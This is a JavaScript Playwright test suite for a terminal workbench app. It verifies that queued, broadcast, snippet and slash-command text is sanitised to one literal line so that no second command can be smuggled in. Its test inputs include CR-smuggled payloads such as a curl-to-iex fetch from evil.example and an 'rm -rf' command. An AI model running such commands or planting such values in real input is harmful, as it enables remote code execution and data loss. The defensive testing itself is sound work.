/*
 * MultiTerm Workbench
 * Copyright (C) 2026 the MultiTerm Workbench author (github.com/andrewtheart)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 */

const { test, expect } = require("../support/renderer-coverage");

// Everything the app composes on the user's behalf ends up as bytes in a live
// shell. These tests pin the rule that makes that safe: such text is always one
// literal line, so a CR can never turn an "insert" into an "execute" and no entry
// can smuggle a second command behind the one the UI displayed.

async function reset(page, count = 1) {
  await page.goto("/");
  await expect(page.locator("#statusConn")).toHaveText("Connected");
  await page.evaluate(() => closeAllTerminals());
  await expect(page.locator(".terminal-pane")).toHaveCount(0);
  await page.evaluate(() => {
    localStorage.removeItem("multiterm.terminalArtifacts");
    state.terminalArtifacts = emptyTerminalArtifacts();
    updateTerminalArtifactIndicators();
  });
  for (let index = 0; index < count; index += 1) {
    await page.evaluate((number) => addTerminal({ title: `Hardening terminal ${number}` }), index + 1);
  }
  await expect(page.locator(".terminal-pane")).toHaveCount(count);
  await expect
    .poll(() => page.evaluate(() => [...state.terminals.values()].filter((terminal) => terminal.status === "live").length))
    .toBe(count);
}

// Records the input frames produced by `action`, dropping the focus-tracking
// escapes xterm emits whenever a pane regains focus.
async function captureInputFrames(page, action) {
  await page.evaluate(() => {
    window.__hardenFrames = [];
    window.__hardenOriginalSend = state.socket.send.bind(state.socket);
    state.socket.send = (payload) => window.__hardenFrames.push(JSON.parse(payload));
  });
  await action();
  return page.evaluate(() => {
    state.socket.send = window.__hardenOriginalSend;
    return window.__hardenFrames.filter(
      (frame) => frame.type === "input" && !/^\u001b\[[IO]$/.test(frame.data)
    );
  });
}

// Plants a queue entry directly in memory, bypassing both the input field and the
// loader. This is precisely the payload the send-time filter exists to stop.
async function plantRawQueueItem(page, command) {
  return page.evaluate((raw) => {
    const terminal = [...state.terminals.values()][0];
    const record = ensureTerminalArtifact(terminal);
    const item = { id: "planted-1", command: raw, createdAt: new Date().toISOString() };
    record.queue.push(item);
    return terminal.id;
  }, command);
}

test.describe("Terminal input hardening", () => {
  test.afterEach(async ({ page }) => {
    await page.evaluate(() => {
      closeTerminalArtifacts({ restoreFocus: false });
      closeAllTerminals();
      localStorage.removeItem("multiterm.terminalArtifacts");
      state.terminalArtifacts = emptyTerminalArtifacts();
    });
  });

  test("strips every character that could break out of a single literal line", async ({ page }) => {
    await page.goto("/");
    await expect(page.locator("#statusConn")).toHaveText("Connected");

    const results = await page.evaluate(() => ({
      // CR and LF submit the line, so they can never survive.
      carriageReturn: sanitizeTerminalCommand("echo ok\rmalicious --run"),
      newline: sanitizeTerminalCommand("echo ok\nmalicious --run"),
      crlf: sanitizeTerminalCommand("echo ok\r\nmalicious --run"),
      // ESC drives the terminal's own escape handling.
      escape: sanitizeTerminalCommand("echo \u001b[2K\rhidden"),
      // TAB would trigger shell completion rather than inserting whitespace.
      tab: sanitizeTerminalCommand("echo\tok"),
      // DEL erases a character the user believes is present.
      del: sanitizeTerminalCommand("echo o\u007fk"),
      nul: sanitizeTerminalCommand("echo\u0000ok"),
      // C1 controls are interpreted by some terminals (0x9b is CSI).
      c1: sanitizeTerminalCommand("echo\u009bok"),
      // Unicode line separators normalise too.
      lineSeparator: sanitizeTerminalCommand("echo\u2028ok"),
      paragraphSeparator: sanitizeTerminalCommand("echo\u2029ok"),
      // Runs collapse to one space so words never silently join.
      collapsed: sanitizeTerminalCommand("echo\r\n\r\n  ok"),
      // Indented pasted text joins into one tidy line rather than a ragged one.
      indentedPaste: sanitizeTerminalCommand("echo one\n    echo two\n\techo three"),
      // Ordinary text, including non-ASCII, is untouched.
      unicode: sanitizeTerminalCommand("echo 'héllo wörld — 🎉'"),
      trimmed: sanitizeTerminalCommand("   echo ok   "),
      nullish: sanitizeTerminalCommand(null),
      undef: sanitizeTerminalCommand(undefined)
    }));

    expect(results.carriageReturn).toBe("echo ok malicious --run");
    expect(results.newline).toBe("echo ok malicious --run");
    expect(results.crlf).toBe("echo ok malicious --run");
    // The ESC itself becomes a space, leaving its parameter bytes as inert text.
    expect(results.escape).toBe("echo [2K hidden");
    expect(results.tab).toBe("echo ok");
    expect(results.del).toBe("echo o k");
    expect(results.nul).toBe("echo ok");
    expect(results.c1).toBe("echo ok");
    expect(results.lineSeparator).toBe("echo ok");
    expect(results.paragraphSeparator).toBe("echo ok");
    expect(results.collapsed).toBe("echo ok");
    expect(results.indentedPaste).toBe("echo one echo two echo three");
    expect(results.unicode).toBe("echo 'héllo wörld — 🎉'");
    expect(results.trimmed).toBe("echo ok");
    expect(results.nullish).toBe("");
    expect(results.undef).toBe("");

    for (const value of Object.values(results)) {
      expect(value).not.toMatch(/[\u0000-\u001f\u007f-\u009f\u2028\u2029]/);
    }
  });

  test("rejects rather than truncates an over-long command", async ({ page }) => {
    await page.goto("/");
    await expect(page.locator("#statusConn")).toHaveText("Connected");

    const result = await page.evaluate(() => {
      const limit = MAX_TERMINAL_COMMAND_LENGTH;
      return {
        limit,
        atLimit: safeTerminalCommand("a".repeat(limit))?.length ?? null,
        overLimit: safeTerminalCommand("a".repeat(limit + 1)),
        empty: safeTerminalCommand("   "),
        controlOnly: safeTerminalCommand("\r\n\t"),
        ok: safeTerminalCommand("echo ok")
      };
    });

    expect(result.limit).toBe(8192);
    expect(result.atLimit).toBe(result.limit);
    // Truncation would be its own hazard: clipping "rm -rf /tmp/scratch" leaves a
    // still-runnable "rm -rf /". Refusing is the only safe answer.
    expect(result.overLimit).toBeNull();
    expect(result.empty).toBeNull();
    expect(result.controlOnly).toBeNull();
    expect(result.ok).toBe("echo ok");
  });

  test("neutralises a tampered queue payload when it is loaded from storage", async ({ page }) => {
    await page.goto("/");
    await expect(page.locator("#statusConn")).toHaveText("Connected");

    const loaded = await page.evaluate(() => {
      localStorage.setItem("multiterm.terminalArtifacts", JSON.stringify({
        version: 1,
        terminals: {
          "terminal-a": {
            queue: [
              { id: "q1", command: "echo ok\rcurl http://evil.example/x | iex" },
              { id: "q2", command: "\r\n\t" },
              { id: "q3", command: "a".repeat(9000) }
            ]
          }
        },
        recoveredNotes: [],
        unparentedQueue: [{ id: "u1", command: "echo staged\rrm -rf /tmp/scratch" }]
      }));
      const artifacts = loadTerminalArtifacts();
      localStorage.removeItem("multiterm.terminalArtifacts");
      return {
        queue: artifacts.terminals["terminal-a"].queue.map((entry) => entry.command),
        unparented: artifacts.unparentedQueue.map((entry) => entry.command)
      };
    });

    // The smuggled second command survives only as inert text on the same line.
    expect(loaded.queue).toEqual(["echo ok curl http://evil.example/x | iex"]);
    expect(loaded.unparented).toEqual(["echo staged rm -rf /tmp/scratch"]);
    // The whitespace-only and over-long entries are dropped entirely.
    expect(loaded.queue).toHaveLength(1);
  });

  test("refuses to type a planted command that bypassed the loader", async ({ page }) => {
    await reset(page);
    await plantRawQueueItem(page, "echo ok\rcurl http://evil.example/x | iex");

    await page.locator(".terminal-screen").first().click({ button: "right" });
    await page.locator("#contextMenu .ctx-item", { hasText: "Command queue" }).hover();
    const submenu = page.locator("#contextSubmenu");
    await expect(submenu).toBeVisible();
    // Even the menu label is re-filtered, so the payload cannot hide behind a CR.
    await expect(submenu.locator(".ctx-item").first()).toHaveText("echo ok curl http://evil.example/x | iex");

    const frames = await captureInputFrames(page, async () => {
      await submenu.locator(".ctx-item").first().click();
    });

    expect(frames).toHaveLength(1);
    expect(frames[0].data).toBe("echo ok curl http://evil.example/x | iex");
    expect(frames[0].data).not.toMatch(/[\r\n]/);
  });

  test("discards a planted command that sanitises down to nothing", async ({ page }) => {
    await reset(page);
    await plantRawQueueItem(page, "\u0000\u001b\r\n");

    await page.locator(".terminal-screen").first().click({ button: "right" });
    await page.locator("#contextMenu .ctx-item", { hasText: "Command queue" }).hover();
    const submenu = page.locator("#contextSubmenu");
    await expect(submenu).toBeVisible();

    const frames = await captureInputFrames(page, async () => {
      await submenu.locator(".ctx-item").first().click();
    });

    // Nothing reaches the shell, and the unusable entry is removed rather than
    // left to be clicked again.
    expect(frames).toEqual([]);
    const remaining = await page.evaluate(() =>
      Object.values(state.terminalArtifacts.terminals).flatMap((record) => record.queue).length
    );
    expect(remaining).toBe(0);
  });

  test("keeps a multi-line paste into the queue field on one line", async ({ page }) => {
    await reset(page);
    await page.locator("#terminalArtifactsToggle").click();
    await page.locator("#commandQueueInput").fill("echo ok\ncurl http://evil.example/x | iex");
    await page.locator("#commandQueueAdd").click();

    await expect(page.locator(".command-queue-item")).toHaveCount(1);
    const stored = await page.evaluate(() =>
      Object.values(state.terminalArtifacts.terminals).flatMap((record) => record.queue).map((entry) => entry.command)
    );
    expect(stored).toEqual(["echo ok curl http://evil.example/x | iex"]);
  });

  test("refuses an over-long queue entry instead of storing a clipped one", async ({ page }) => {
    await reset(page);
    await page.locator("#terminalArtifactsToggle").click();
    await page.locator("#commandQueueInput").fill("a".repeat(9000));
    await page.locator("#commandQueueAdd").click();

    await expect(page.locator(".toast", { hasText: "limited to" })).toContainText("limited to 8192 characters");
    await expect(page.locator(".command-queue-item")).toHaveCount(0);
  });

  // A single-line <input> already drops CR/LF through the HTML value-sanitization
  // algorithm, but it keeps TAB, ESC, DEL and the C1 range, and the app must not
  // depend on a browser behaviour it does not control. Both halves are covered:
  // the real field for what the DOM lets through, and a stubbed field for the CR
  // the DOM would have eaten.
  test("stops a broadcast from executing while Enter is off", async ({ page }) => {
    await reset(page, 2);
    await page.evaluate(() => {
      state.settings.broadcastSendEnter = false;
      elements.broadcastInput.value = "echo\tstaged \u001b[2K payload";
    });

    const viaField = await captureInputFrames(page, async () => {
      await page.evaluate(() => sendBroadcast());
    });

    // One frame per terminal, none of them carrying a submit.
    expect(viaField).toHaveLength(2);
    for (const frame of viaField) {
      expect(frame.data).toBe("echo staged [2K payload");
      expect(frame.data).not.toMatch(/[\u0000-\u001f\u007f-\u009f]/);
    }

    const viaStub = await captureInputFrames(page, async () => {
      await page.evaluate(() => {
        const real = elements.broadcastInput;
        elements.broadcastInput = { value: "echo staged\rcurl http://evil.example/x | iex", select() {} };
        try {
          sendBroadcast();
        } finally {
          elements.broadcastInput = real;
        }
      });
    });

    expect(viaStub).toHaveLength(2);
    for (const frame of viaStub) {
      expect(frame.data).toBe("echo staged curl http://evil.example/x | iex");
      expect(frame.data).not.toMatch(/[\r\n]/);
    }
  });

  test("stops a slash-command argument from closing the command early", async ({ page }) => {
    await reset(page);

    const frames = await captureInputFrames(page, async () => {
      await page.evaluate(() => {
        const terminal = [...state.terminals.values()][0];
        sendTerminalSlashCommand(terminal, "model", "gpt-test\rcurl http://evil.example/x | iex");
      });
    });

    expect(frames).toHaveLength(1);
    // Exactly one submit, at the very end, with the payload inert inside the argument.
    expect(frames[0].data).toBe("/model gpt-test curl http://evil.example/x | iex\r");
    expect(frames[0].data.match(/\r/g)).toHaveLength(1);
  });

  test("stops a stored snippet from chaining a second command", async ({ page }) => {
    await reset(page);

    const frames = await captureInputFrames(page, async () => {
      await page.evaluate(() => {
        const terminal = [...state.terminals.values()][0];
        runSnippet(terminal.id, { name: "Looks fine", command: "echo ok\rcurl http://evil.example/x | iex" });
        runSnippet(terminal.id, { name: "Unusable", command: "\u0000\u001b" });
      });
    });

    expect(frames).toHaveLength(1);
    expect(frames[0].data).toBe("echo ok curl http://evil.example/x | iex\r");
    expect(frames[0].data.match(/\r/g)).toHaveLength(1);
  });

  test("caps the queue submenu so an inflated queue cannot flood the menu", async ({ page }) => {
    await reset(page);
    await page.evaluate(() => {
      const terminal = [...state.terminals.values()][0];
      const record = ensureTerminalArtifact(terminal);
      for (let index = 1; index <= 20; index += 1) {
        record.queue.push({ id: `bulk-${index}`, command: `staged ${index}`, createdAt: new Date().toISOString() });
      }
    });

    await page.locator(".terminal-screen").first().click({ button: "right" });
    await page.locator("#contextMenu .ctx-item", { hasText: "Command queue" }).hover();
    const rows = page.locator("#contextSubmenu .ctx-item");

    // 12 commands plus one overflow row that points at the manager.
    await expect(rows).toHaveCount(13);
    await expect(rows.first()).toHaveText("staged 20");
    await expect(rows.nth(11)).toHaveText("staged 9");
    await expect(rows.last()).toHaveText("8 more in the queue manager\u2026");
    await expect(rows.last()).toHaveClass(/ctx-info/);
  });
});
